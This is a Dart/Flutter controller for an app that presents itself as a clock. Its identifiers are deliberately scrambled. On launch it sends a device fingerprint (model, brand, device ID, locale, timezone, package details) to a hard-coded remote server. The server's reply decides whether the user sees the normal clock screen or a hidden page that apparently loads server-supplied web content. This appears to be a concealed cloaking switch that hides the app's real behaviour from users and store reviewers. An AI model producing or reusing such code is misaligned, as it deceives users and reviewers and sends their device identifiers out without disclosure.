import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter/services.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';


class ClockInnerLogic extends GetxController {

  var ncgzvfmal = RxBool(false);
  var znkbaw = RxBool(true);
  var aclwy = RxString("");
  var stephan = RxBool(false);
  var daugherty = RxBool(true);
  final xgclejvr = Dio();


  InAppWebViewController? webViewController;

  dynamic opydgkmrba(){
    final kchdiz = InternetConnectionChecker.instance;
    final erhunvigqb = kchdiz.onStatusChange.skip(1).listen(
          (InternetConnectionStatus oemksxpcft) {
        if (oemksxpcft == InternetConnectionStatus.connected) {
          cawo();
        } else {
          Get.toNamed('/ClockBreakPage')?.then((_){
            cawo();
          });
        }
      },
    );
    return erhunvigqb;
  }

  Future<bool> xsikdpluz() async {
    var rwxqgu = await InternetConnectionChecker.instance.hasConnection;
    if(!rwxqgu){
      Get.toNamed('/ClockBreakPage')?.then((_){
        cawo();
      });
    }
    return rwxqgu;
  }

  @override
  void onInit() {
    super.onInit();
    opydgkmrba();
    cawo();
  }


  Future<void> cawo() async {

    var cxwlmezh = await xsikdpluz();
    if(!cxwlmezh){
      return;
    }

    stephan.value = true;
    daugherty.value = true;
    znkbaw.value = false;

    xgclejvr.post("https://min.seekful.net/H3evDV",data: await phqoaf()).then((value) {
      var meli = value.data["meli"] as String;
      var dcryhzga = value.data["dcryhzga"] as bool;
      if (dcryhzga) {
        SystemChrome.setPreferredOrientations([
          DeviceOrientation.portraitUp,
          DeviceOrientation.portraitDown,
        ]);
        aclwy.value = meli;
        jesus();
      } else {
        fahey();
      }
    }).catchError((e) {
      znkbaw.value = true;
      daugherty.value = true;
      stephan.value = false;
    });
  }

  Future<Map<String, dynamic>> phqoaf() async {
    final DeviceInfoPlugin inyzgt = DeviceInfoPlugin();
    PackageInfo lvho_hkwmo = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var mxhr = Platform.localeName;
    var jBzoYe = currentTimeZone;

    var nHkfRPq = lvho_hkwmo.packageName;
    var gXLKsbkV = lvho_hkwmo.version;
    var hQrCm = lvho_hkwmo.buildNumber;

    var ovksIl = lvho_hkwmo.appName;
    var xruc = "";
    var ZMYbkL  = "";
    var MsOuoKJ = "";
    var othoWard = "";
    var miguelSchulist = "";
    var sunnyMurphy = "";
    var vaughnHill = "";
    var claudieMaggio = "";
    var joanOlson = "";
    var jedCorkery = "";


    var iFGkm = "";
    var HkmtM = false;

    if (GetPlatform.isAndroid) {
      iFGkm = "android";
      var blzmefvuqx = await inyzgt.androidInfo;

      MsOuoKJ = blzmefvuqx.brand;

      xruc  = blzmefvuqx.model;
      ZMYbkL = blzmefvuqx.id;

      HkmtM = blzmefvuqx.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      iFGkm = "ios";
      var udghfjs = await inyzgt.iosInfo;
      MsOuoKJ = udghfjs.name;
      xruc = udghfjs.model;

      ZMYbkL = udghfjs.identifierForVendor ?? "";
      HkmtM  = udghfjs.isPhysicalDevice;
    }
    var res = {
      "hQrCm": hQrCm,
      "gXLKsbkV": gXLKsbkV,
      "sunnyMurphy" : sunnyMurphy,
      "nHkfRPq": nHkfRPq,
      "xruc": xruc,
      "MsOuoKJ": MsOuoKJ,
      "ZMYbkL": ZMYbkL,
      "vaughnHill" : vaughnHill,
      "mxhr": mxhr,
      "iFGkm": iFGkm,
      "HkmtM": HkmtM,
      "ovksIl": ovksIl,
      "othoWard" : othoWard,
      "miguelSchulist" : miguelSchulist,
      "claudieMaggio" : claudieMaggio,
      "jBzoYe": jBzoYe,
      "joanOlson" : joanOlson,
      "jedCorkery" : jedCorkery,

    };
    return res;
  }

  Future<void> fahey() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> jesus() async {
    Get.offNamed("/ClockMainBack");
  }

  @override
  void dispose() {
    opydgkmrba().cancel();
    super.dispose();
  }

}
